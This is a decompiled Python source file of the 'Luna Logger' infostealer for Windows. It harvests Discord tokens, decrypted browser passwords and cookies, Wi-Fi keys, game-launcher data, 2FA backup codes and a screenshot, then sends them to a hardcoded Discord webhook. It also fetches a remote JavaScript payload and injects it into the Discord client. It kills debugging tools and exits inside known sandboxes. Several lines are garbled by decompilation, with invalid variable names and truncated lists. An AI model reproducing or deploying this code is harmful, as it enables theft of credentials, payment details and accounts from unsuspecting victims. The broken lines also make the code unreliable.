# Decompiled with PyLingual (https://pylingual.io)
# Internal filename: narkoz.py
# Bytecode version: 3.10.0rc2 (3439)
# Source timestamp: 1970-01-01 00:00:00 UTC (0)

import os
import platform
import re
import threading
import uuid
import requests
import wmi
import subprocess
import sqlite3
import psutil
import json
import base64
from shutil import copy2
from sys import exit
from zipfile import ZipFile
from Crypto.Cipher import AES
from discord import Embed, File, SyncWebhook
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
__WEBHOOK__ = 'https://discord.com/api/webhooks/985849060227428362/62Kk2EFagn67oXkVgPN2DHpwUWOe6DtVwjBkcthzTRVTY6gP3ZhKJyw814luDcL7g2Az'
__PING__ = True
__PINGTYPE__ = 'everyone'

def main(webhook: str):
    webhook = SyncWebhook.from_url(webhook, session=requests.Session())
    threads = [browsers, ss, grabwifi, mc_tokens, epicgames_data, mfa_codes]
    for func in threads:
        process = threading.Thread(target=func, daemon=True)
        process.start()
    for t in threading.enumerate():
        try:
            t.join()
        except RuntimeError:
            continue
    zipup()
    _file = None
    _file = File(f"Luna-Logged-{os.getenv('Username')}.zip")
    content = ''
    if __PING__:
        if __PINGTYPE__ == 'everyone':
            content += '@everyone'
        else:  # inserted
            if __PINGTYPE__ == 'here':
                content += '@here'
    webhook.send(content=content, file=_file, avatar_url='https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096', username='Luna')
    grabpcinfo()
    grabtokens()

def Luna(webhook: str):
    debug()
    procs = [main, inject]
    for proc in procs:
        proc(webhook)
    os.remove(f"Luna-Logged-{os.getenv('Username')}.zip")

def try_extract(func):
    def wrapper(*args, **kwargs):
        try:
            func(*args, **kwargs)
        except Exception:
            return None
    return wrapper

class grabpcinfo:
    def __init__(self) -> None:
        self.get_inf(__WEBHOOK__)

    def get_inf(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
        embed = Embed(title='Luna Logger', color=5639644)
        computer_os = platform.platform()
        cpu = wmi.WMI().Win32_Processor()[0]
        gpu = wmi.WMI().Win32_VideoController()[0]
        ram = round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
        embed.add_field(name='System Info', value=f'💻 `PC Username:` **{username}**\n<:computer_2:996126609650225322> `PC Name:` **{hostname}**\n🌐 `OS:` **{computer_os}**\n\n👀 `IP:` **{ip}**\n🍏 `MAC:` **{mac}**\n🔧 `HWID:` **{hwid}**\n\n<:cpu:996126314555768882> `CPU:` **{cpu.Name}**\n<:gpu:996126996952272906> `GPU:` **{gpu.Name}**\n<:rgbram:996127801025495081> `RAM:` **{ram}GB**', inline=False)
        embed.set_footer(text='Luna Logger | Created by Smug')
        embed.set_thumbnail(url='https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096')
        webhook.send(embed=embed, avatar_url='https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096', username='Luna')

class grabtokens:
    def __init__(self) -> None:
        self.baseurl = 'https://discord.com/api/v9/users/@me'
        self.appdata = os.getenv('localappdata')
        self.roaming = os.getenv('appdata')
        self.regex = '[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}'
        self.encrypted_regex = 'dQw4w9WgXcQ:[^\\\"]*'
        self.tokens_sent = []
        self.tokens = []
        self.ids = []
        self.grabTokens()
        self.upload(__WEBHOOK__)

    def decrypt_val(self, buff, master_key) -> str:
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:(-16)].decode()
            return decrypted_pass
        except Exception:
            return 'Failed to decrypt password'

    def get_master_key(self, path) -> str:
        with open(path, 'r', encoding='utf-8') as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\', 'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\', 'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\', 'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\', 'Opera': self.appdata + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\', 'Opera GX': self.appdata + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\', 'Amigo': self.appdata + '\\Amigo\\User Data\\Local Storage\\leveldb\\', 'Torch': self.appdata + '\\Torch\\User Data\\Local Storage\\leveldb\\', 'Kometa': self.appdata + '\\Kometa\\User Data\\Local Storage\\leveldb\\', 'Orbitum': self.appdata + '\\Orbitum\\User Data\\Local Storage\\leveldb\\', 'CentBrowser': self.appdata + '\\CentBrowser\\User Data\\Local Storage\\leveldb\\', '7Star': self.appdata + '\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\', 'Sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\', 'Vivaldi': self.appdata + '\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\', 'Chrome SxS': self.appdata + '\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\', 'Chrome': self.appdata +
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(' ', '').lower()
            if 'cord' in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[(-3):] not in ['log', 'ldb']:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                try:
                                    token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                except ValueError:
                                    pass
                                try:
                                    r = requests.get(self.baseurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token})
                                except Exception:
                                    pass
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:  # inserted
                for file_name in os.listdir(path):
                    if file_name[(-3):] not in ['log', 'ldb']:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token})
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)
        if os.path.exists(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
            for path, _, files in os.walk(self.roaming + '\\Mozilla\\Firefox\\Profiles'):
                for _file in files:
                    if not _file.endswith('.sqlite'):
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{_file}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            try:
                                r = requests.get(self.baseurl, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token})
                            except Exception:
                                pass
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def upload(self, webhook):
        webhook = SyncWebhook.from_url(webhook, session=requests.Session())
        for token in self.tokens:
            if token in self.tokens_sent:
                pass
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Content-Type': 'application/json', 'Authorization': token}
            val = ''
            r = requests.get(self.baseurl, headers=headers).json()
            username = r['username'] + '#' + r['discriminator']
            discord_id = r['id']
            avatar = f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif" if requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{discord_id}/{r['avatar']}.png"
            phone = r['phone']
            email = r['email']
            embed = Embed(title=username, color=5639644)
            try:
                if r['mfa_enabled']:
                    mfa = '✅'
                else:  # inserted
                    mfa = '❌'
            except Exception:
                mfa = '❌'
            try:
                if r['premium_type'] == 1:
                    nitro = 'Nitro Classic'
                else:  # inserted
                    if r['premium_type'] == 2:
                        nitro = 'Nitro Boost'
            except BaseException:
                nitro = 'None'
            b = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers=headers).json()
            if b == []:
                methods = 'None'
            else:  # inserted
                methods = ''
                try:
                    for method in b:
                        if method['type'] == 1:
                            methods += '💳'
                        else:  # inserted
                            if method['type'] == 2:
                                methods += '<:paypal:973417655627288666>'
                            else:  # inserted
                                methods += '❓'
                except TypeError:
                    methods += '❓'
            val += f'<:1119pepesneakyevil:972703371221954630> `Discord ID:` **{discord_id}** \n<:gmail:996083031632773181> `Email:` **{email}**\n<:mobilephone:996101721879224331> `Phone:` **{phone}**\n\n<:2fa:996102455744012428> `2FA:` **{mfa}**\n<a:nitroboost:996004213354139658> `Nitro:` **{nitro}**\n<:billing:996099943574012024> `Billing:` **{methods}**\n\n<:pepehappy:996100452112400526> `Token:` **{token}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n'
            g = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers=headers)
            val_codes = []
            if 'code' in g.text:
                codes = json.loads(g.text)
                try:
                    for code in codes:
                        val_codes.append((code['code'], code['promotion']['outbound_title']))
                except TypeError:
                    pass
            if val_codes == []:
                val += '\n:gift: **No Gift Cards Found**\n'
            else:  # inserted
                for c, t in val_codes:
                    val += f'\n:gift: `{t}:`\n**{c}**\n[Click to copy!](https://paste-pgpj.onrender.com/?p={c})\n'
            embed.add_field(name='Discord Info', value=val + '​', inline=False)
            embed.set_thumbnail(url=avatar)
            webhook.send(embed=embed, avatar_url='https://cdn.discordapp.com/icons/958782767255158876/a_0949440b832bda90a3b95dc43feb9fb7.gif?size=4096', username='Luna')
            self.tokens_sent += token

@try_extract
class browsers:
    def __init__(self) -> None:
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browsers = {'amigo': self.appdata + '\\Amigo\\User Data', 'torch': self.appdata + '\\Torch\\User Data', 'kometa': self.appdata + '\\Kometa\\User Data', 'orbitum': self.appdata + '\\Orbitum\\User Data', 'cent-browser': self.appdata + '\\CentBrowser\\User Data', '7star': self.appdata + '\\7Star\\7Star\\User Data', 'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data', 'vivaldi': self.appdata + '\\Vivaldi\\User Data', 'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data', 'google-chrome': self.appdata + '\\Google\\Chrome\\User Data', 'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data', 'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data', 'uran': self.appdata + '\\uCozMedia\\Uran\\User Data', 'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data', 'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data', 'iridium': self.appdata +
        self.profiles = ['Default', 'Profile 1', 'Profile 2', 'Profile 3', 'Profile 4', 'Profile 5']
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue
            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [self.cookies, self.history, self.passwords]
            for profile in self.profiles:
                for func in self.funcs:
                    try:
                        func(name, path, profile)
                    except:
                        continue

    def get_master_key(self, path: str) -> str:
        with open(path, 'r', encoding='utf-8') as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:(-16)].decode()
        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str) -> None:
        path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        copy2(path, 'Loginvault.db')
        conn = sqlite3.connect('Loginvault.db')
        cursor = conn.cursor()
        with open('.\\browser-passwords.txt', 'a') as f:
            for res in cursor.execute('SELECT origin_url, username_value, password_value FROM logins').fetchall():
                url, username, password = res
                password = self.decrypt_password(password, self.masterkey)
                if url and username and (password!= ''):
                    f.write('Username: {:<40} Password: {:<40} URL: {}\n'.format(username, password, url))
                else:  # inserted
                    f.write('No passwords were found :(')
        cursor.close()
        conn.close()
        os.remove('Loginvault.db')

    def cookies(self, name: str, path: str, profile: str) -> None:
        path += '\\' + profile + '\\Network\\Cookies'
        if not os.path.isfile(path):
            return
        copy2(path, 'Cookievault.db')
        conn = sqlite3.connect('Cookievault.db')
        cursor = conn.cursor()
        with open('.\\browser-cookies.txt', 'a', encoding='utf-8') as f:
            for res in cursor.execute('SELECT host_key, name, path, encrypted_value,expires_utc FROM cookies').fetchall():
                host_key, name, path, encrypted_value, expires_utc = res
                value = self.decrypt_password(encrypted_value, self.masterkey)
                if host_key and name and (value!= ''):
                    f.write('{}\t{}\t{}\t{}\t{}\t{}\t{}\n'.format(host_key, 'FALSE' if expires_utc == 0 else 'TRUE', path, 'FALSE' if host_key.startswith('.') else 'TRUE', expires_utc, name, value))
                else:  # inserted
                    f.write('No cookies were found :(')
        cursor.close()
        conn.close()
        os.remove('Cookievault.db')

    def history(self, name: str, path: str, profile: str) -> None:
        path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        copy2(path, 'Historyvault.db')
        conn = sqlite3.connect('Historyvault.db')
        cursor = conn.cursor()
        with open('.\\browser-history.txt', 'a', encoding='utf-8') as f:
            sites = []
            for res in cursor.execute('SELECT url, title, visit_count, last_visit_time FROM urls').fetchall():
                url, title, visit_count, last_visit_time = res
                if url and title and visit_count and (last_visit_time!= ''):
                    sites.append((url, title, visit_count, last_visit_time))
            sites.sort(key=lambda x: x[3], reverse=True)
            for site in sites:
                f.write('Visit Count: {:<6} Title: {:<40}\n'.format(site[2], site[1]))
        cursor.close()
        conn.close()
        os.remove('Historyvault.db')

def ss():
    ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None).save('desktop-screenshot.png')

@try_extract
class grabwifi:
    def __init__(self):
        self.wifi_list = []
        self.name_pass = {}
        with open('.\\wifi-passwords.txt', 'w', encoding='cp437', errors='ignore') as f:
            f.write(f'{github} | Wifi Networks & Passwords\n\n')
        data = subprocess.getoutput('netsh wlan show profiles').split('\n')
        for line in data:
            if 'All User Profile' in line:
                self.wifi_list.append(line.split(':')[(-1)][1:])
            else:  # inserted
                with open('.\\wifi-passwords.txt', 'a') as f:
                    f.write('There is no wireless interface on the system. Ethernet using twat.')
                f.close()
        for i in self.wifi_list:
            command = subprocess.getoutput(f'netsh wlan show profile \"{i}\" key=clear')
            if 'Key Content' in command:
                split_key = command.split('Key Content')
                tmp = split_key[1].split('\n')[0]
                key = tmp.split(': ')[1]
                self.name_pass[i] = key
            else:  # inserted
                key = ''
                self.name_pass[i] = key
        with open('.\\wifi-passwords.txt', 'a') as f:
            for i, j in self.name_pass.items():
                f.write(f'Wifi Name : {i} | Password : {j}\n')
        f.close()

@try_extract
class mc_tokens:
    def __init__(self):
        self.roaming = os.getenv('appdata')
        self.accounts_path = '\\.minecraft\\launcher_accounts.json'
        self.usercache_path = '\\.minecraft\\usercache.json'
        self.error_message = 'No minecraft accounts or access tokens :('
        self.session_info()
        self.user_cache()

    def session_info(self):
        with open('.\\minecraft-sessioninfo.json', 'w', encoding='cp437', errors='ignore') as f:
            if os.path.exists(self.roaming + self.accounts_path):
                with open(self.roaming + self.accounts_path, 'r') as g:
                    self.session = json.load(g)
                    f.write(json.dumps(self.session, indent=4))
            else:  # inserted
                f.write(self.error_message)

    def user_cache(self):
        with open('.\\minecraft-usercache.json', 'w', encoding='cp437', errors='ignore') as f:
            if os.path.exists(self.roaming + self.usercache_path):
                with open(self.roaming + self.usercache_path, 'r') as g:
                    self.user = json.load(g)
                    f.write(json.dumps(self.user, indent=4))
            else:  # inserted
                f.write(self.error_message)

@try_extract
class epicgames_data:
    def __init__(self):
        self.local = os.getenv('localappdata')
        self.epic = self.local + '\\EpicGamesLauncher\\Saved\\Config\\Windows\\GameUserSettings.ini'
        self.get_data()

    def get_data(self):
        with open('.\\epicgames-data.txt', 'w', encoding='cp437', errors='ignore') as g:
            g.write(f'{github} | Epic Games Offline Data\n\n')
            if os.path.exists(self.epic):
                with open(self.epic, 'r') as f:
                    for line in f.readlines():
                        if line.startswith('Data='):
                            g.write(line.split('Data=')[1].strip())
            else:  # inserted
                g.write('No epic games data was found :(')

@try_extract
class mfa_codes:
    def __init__(self):
        self.path = os.environ['HOMEPATH']
        self.code_path = '\\Downloads\\discord_backup_codes.txt'
        self.get_codes()

    def get_codes(self):
        with open('.\\discord-2fa-codes.txt', 'w', encoding='utf-8', errors='ignore') as f:
            f.write(f'{github} | Discord Backup Codes\n')
            if os.path.exists(self.path + self.code_path):
                with open(self.path + self.code_path, 'r') as g:
                    for line in g.readlines():
                        if line.startswith('*'):
                            f.write(line)
            else:  # inserted
                f.write('No discord backup codes found')

def zipup():
    with ZipFile(f"Luna-Logged-{os.getenv('Username')}.zip", 'w') as zipf:
        files = ['browser-passwords.txt', 'browser-cookies.txt', 'browser-history.txt', 'wifi-passwords.txt', 'minecraft-sessioninfo.json', 'minecraft-usercache.json', 'epicgames-data.txt', 'discord-2fa-codes.txt', 'desktop-screenshot.png']
        for file in files:
            if os.path.exists(file):
                zipf.write(file)
                os.remove(file)
            else:  # inserted
                pass

class inject:
    def __init__(self, webhook: str):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [self.appdata + '\\Discord', self.appdata + '\\DiscordCanary', self.appdata + '\\DiscordPTB', self.appdata + '\\DiscordDevelopment']
        self.code = requests.get('https://raw.githubusercontent.com/Smug246/Luna-Token-Grabber/main/injection.js').text
        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue
            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write(self.code.replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                    self.start_discord(dir)

    def get_core(self, dir: str):
        for file in os.listdir(dir):
            if re.search('app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search('discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return (core, file)
        else:  # inserted
            return None

    def start_discord(self, dir: str):
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[(-1)] + '.exe'
        for file in os.listdir(dir):
            if re.search('app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

class debug:
    def __init__(self) -> None:
        if self.checks():
            self.self_destruct()

    def checks(self) -> bool:
        debugging = False
        self.blackListedUsers = ['WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']
        self.blackListedPCNames = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']
        2E6FB594-9D55-4424-8E74-CE25A25E36B0 = ['7AB5C494-39F5-4941-9163-47F54D6D5016', '03DE0294-0480-05DE-1A06-350700080009', '11111111-2222-3333-4444-555555555555', '6F3CA5EC-BEC9-4A4D-8274-11168F640058', 'ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548', '4C4C4544-0050-3710-8058-CAC04F59344A', '00000000-0000-0000-0000-AC1F6BD04972', '00000000-0000-0000-0000-000000000000', '5BD24D56-789F-8468-7CDC-CAA7222CC121', '49434D53-0200-9065-2500-65902500E439', '49434D53-0200-9036-2500-36902500F022', '777D84B3-88D1-451C-93E4-D235177420A7', '49434D53-0200-9036-2500-369025000C65', 'B1112042-52E8-E25B-3655-6A4F54155DBF', '00000000-0000-0000-0000-AC1F6BD048FE', 'EB16924B-FB6D-4FA1-8666-17B91F62FB37', 'A15A930C-8251-9645-AF63-E45AD728C20C', '67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3', 'C7D23342-A5D4-68A1-59AC-CF40F735B363', '63203342-0EB0-AA1A-4DF5-3FB37DBB0670', '44B94D56-65AB-DC02-86A0-98143A7423BF', '6608003F-ECE4-494E-B07E-1C4615D1D93C', 'D9142042-8F51-5EFF-D5F8-EE9AE3D1602A', '49434D53-0200-9036-2500-369025003AF0', '8B4E8278-525C-7343-B825-280AEBCD3BCB', '4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27', '79AF5279-16CF-4094-9758-F88A616D81B4', 'FF577B79-782E-0A4D-8568-B35A9B7EB76B', '08C1E400-3C56-11EA-8000-3CECEF43FEDE', '6ECEAF72-3548-476C-BD8D-73134A9182C8', '49434D53-0200-9036-2500-369025003865', '119602E8-92F9-BD4B-8979-DA682276D385', '12204D56-28C0-AB03-51B7-44A8B7525250', '63FA3342-31C7-4E8E-8089-DAFF6CE5E967', '365B4000-3B25-11EA-8000-3CECEF44010C', 'D8C30328-1B06-4611-8E3C-E433F4F9794E', '00000000-0000-0000-0000-50E5493391EF', '00000000-0000-0000-0000-AC1F6BD04D98', '4CB82042-BA8F-1748-C941-363C391CA7F3', 'B6464A2B-92C7-4B95-A2D0-E5410081B812', 'BB233342-2E01-718F-D4A1-E7F69D026428', '9921DE3A-5C1A-DF11-9078-563412000026', 'CC5B3F62-2A04-4D2E-A46C-AA41B7050712', '00000000-0000-0000-0000-AC1F6BD04986', 'C249957A-AA08-4B21-933F-9271BEC63C85', 'BE784D56-81F5-2C8D-9D4B-5AB56F05D86E', 'ACA69200-3C4C-11EA-8000-3CECEF4401AA', '3F284CA4-8BDF-489B-A273-41B44D668F6D', 'BB64E044-87BA-C847-BC0A-C797D1A16A50', '2E6FB594-9D55-4424-8E74-CE25A25E36B0',
        self.blackListedIPS = ['88.132.231.71', '78.139.8.50', '20.99.160.173', '88.153.199.169', '84.147.62.12', '194.154.78.160', '92.211.109.160', '195.74.76.222', '188.105.91.116', '34.105.183.68', '92.211.55.199', '79.104.209.33', '95.25.204.90', '34.145.89.174', '109.74.154.90', '109.145.173.169', '34.141.146.114', '212.119.227.151', '195.239.51.59', '192.40.57.234', '64.124.12.162', '34.142.74.220', '188.105.91.173', '109.74.154.91', '34.105.72.241', '109.74.154.92', '213.33.142.50', '109.74.154.91', '93.216.75.209', '192.87.28.103', '88.132.226.203', '195.181.175.105', '88.132.225.100', '92.211.192.144', '34.83.46.130', '188.105.91.143', '34.85.243.241', '34.141.245.25', '178.239.165.70', '84.147.54.113', '193.128.114.45', '95.25.81.24', '92.211.52.62', '88.132.227.238', '35.199.6.13', '80.211.0.97', '34.85.253.170', '23.128.248.46', '35.229.69.227', '34.138.96.23',
        1e:6c:34:93:68:64 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de',
        self.blacklistedProcesses = ['httpdebuggerui', 'wireshark', 'fiddler', 'regedit', 'cmd', 'taskmgr', 'vboxservice', 'df5serv', 'processhacker', 'vboxtray', 'vmtoolsd', 'vmwaretray', 'ida64', 'ollydbg', 'pestudio', 'vmwareuser', 'vgauthservice', 'vmacthlp', 'x96dbg', 'vmsrvc', 'x32dbg', 'vmusrvc', 'prl_cc', 'prl_tools', 'xenservice', 'qemu-ga', 'joeboxcontrol', 'ksdumperclient', 'ksdumper', 'joeboxserver']
        self.check_process()
        if self.get_network():
            debugging = True
        if self.get_system():
            debugging = True
        return debugging

    def check_process(self) -> bool:
        for proc in psutil.process_iter():
            if any((procstr in proc.name().lower() for procstr in self.blacklistedProcesses)):
                try:
                    proc.kill()
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    continue

    def get_network(self) -> bool:
        global mac  # inserted
        global github  # inserted
        global ip  # inserted
        ip = requests.get('https://api.ipify.org').text
        mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
        github = 'https://github.com/Smug246'
        if ip in self.blackListedIPS:
            return True
        if mac in self.blackListedMacs:
            return True

    def get_system(self) -> bool:
        global hostname  # inserted
        global hwid  # inserted
        global username  # inserted
        username = os.getenv('UserName')
        hostname = os.getenv('COMPUTERNAME')
        hwid = subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        if hwid in self.blackListedHWIDS:
            return True
        if username in self.blackListedUsers:
            return True
        if hostname in self.blackListedPCNames:
            return True

    def self_destruct(self) -> None:
        exit()
if __name__ == '__main__' and os.name == 'nt':
    Luna(__WEBHOOK__)